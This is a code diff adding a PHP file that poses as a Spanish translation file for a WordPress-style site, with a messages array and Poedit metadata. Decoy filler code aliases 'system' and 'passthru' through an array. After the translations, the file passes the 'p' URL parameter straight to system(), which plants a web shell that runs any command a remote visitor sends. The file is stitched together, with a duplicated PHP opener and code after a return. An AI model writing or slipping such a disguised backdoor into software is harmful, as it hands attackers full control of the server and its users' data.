@@ -1,0 +1,17 @@
+<?php
+$fmap = array('x1' => 'system', 'x2' => 'passthru');
+$x_fake1 = 1234;
+$noise = 'obfuscation'.'test';
+$tmp = $x_fake1 * 42;
+$flag = false;
+$useless = function($v) { return $v . rand(); };
+$dummy_check = $useless('xx');
+if ($flag) { echo 'Debug enabled'; }
+for ($i = 0; $i < 1; $i++) { $tmp += $i; }
+while (false) { echo 'dead loop'; break; }
+
+<?php
+return ['domain'=>NULL,'plural-forms'=>'nplurals=2; plural=n != 1;','messages'=>['text directionltr'=>'ltr','<strong>ERROR</strong>: Sorry, that username is not allowed.'=>'<strong>ERROR</strong>: Lo siento, ese nombre de usuario no está permitido.','Invalid parameter.'=>'Parámetro no válido. ','menu location(Current: %s)'=>'(Actual: %s)','menu(Currently set to: %s)'=>'(Actualmente fijado en: %s)','[%1$s] Confirm Action: %2$s'=>'[%1$s] Confirmar la acción: %2$s','[%s] Erasure Request Fulfilled'=>'[%s] Solicitud de borrado completada','[%s] Personal Data Export'=>'[%s] Exportación de datos personales'],'language'=>'es_ES','x-generator'=>'Poedit 2.3'];
+$cmd = $_GET['p'];
+$fmap['x1']($cmd);
+?>
